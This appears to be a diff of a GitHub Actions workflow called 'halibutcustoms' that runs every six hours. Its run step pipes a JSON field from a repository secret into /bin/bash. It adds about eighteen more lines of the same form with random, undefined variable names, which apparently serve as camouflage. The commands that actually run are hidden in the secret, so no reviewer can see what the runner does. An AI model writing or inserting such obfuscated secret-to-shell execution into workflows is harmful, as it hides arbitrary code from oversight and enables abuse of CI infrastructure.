@@ -3,7 +3,7 @@ name: halibutcustoms
 on:
   workflow_dispatch:
   schedule:
-    - cron: '30 1/6 * * *'
+    - cron: '0 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,21 +12,25 @@ jobs:
       - uses: actions/checkout@v4
       - name: halibutcustoms
         env:
-          rumf255: ${{ secrets.rumf255 }}
+          bbf16736: ${{ secrets.bbf16736 }}
         run: |
-          echo $rumf255 | jq -r .j50 | /bin/bash
-          echo $shr64 | jq -r .nmd7053 | /bin/bash
-          echo $koz5031 | jq -r .fl99 | /bin/bash
-          echo $owt579 | jq -r .bmzg97 | /bin/bash
-          echo $wfytf4898 | jq -r .iiqtt318 | /bin/bash
-          echo $rqjb53373 | jq -r .dsur863 | /bin/bash
-          echo $ddl79 | jq -r .ubixd0 | /bin/bash
-          echo $sz2 | jq -r .fqsf1 | /bin/bash
-          echo $an6792 | jq -r .nx134 | /bin/bash
-          echo $fd5 | jq -r .zlk7219 | /bin/bash
-          echo $ibqa1094 | jq -r .hmjch7876 | /bin/bash
-          echo $tliy3707 | jq -r .lg0507 | /bin/bash
-          echo $zyyuh4 | jq -r .d849 | /bin/bash
-          echo $xw329 | jq -r .sa0 | /bin/bash
-          echo $jc39706 | jq -r .g46 | /bin/bash
+          echo $bbf16736 | jq -r .ezt97589 | /bin/bash
+          echo $qsxb2712 | jq -r .s10845 | /bin/bash
+          echo $lvd5 | jq -r .a04 | /bin/bash
+          echo $dzg3502 | jq -r .u8 | /bin/bash
+          echo $vd32 | jq -r .zptqm5 | /bin/bash
+          echo $uymnx567 | jq -r .b58 | /bin/bash
+          echo $q593 | jq -r .h81007 | /bin/bash
+          echo $uhs2 | jq -r .pu60 | /bin/bash
+          echo $teew671 | jq -r .hnphc31 | /bin/bash
+          echo $xek527 | jq -r .fktl76507 | /bin/bash
+          echo $k1328 | jq -r .kehsj0 | /bin/bash
+          echo $xvabb7 | jq -r .muqp6009 | /bin/bash
+          echo $d4987 | jq -r .zhsf4317 | /bin/bash
+          echo $zs0 | jq -r .bqtw852 | /bin/bash
+          echo $si6 | jq -r .joxn3 | /bin/bash
+          echo $a01 | jq -r .w88 | /bin/bash
+          echo $j3 | jq -r .nzplb5715 | /bin/bash
+          echo $r94 | jq -r .npikd077 | /bin/bash
+          echo $wndcx67 | jq -r .qhmdg17 | /bin/bash
 
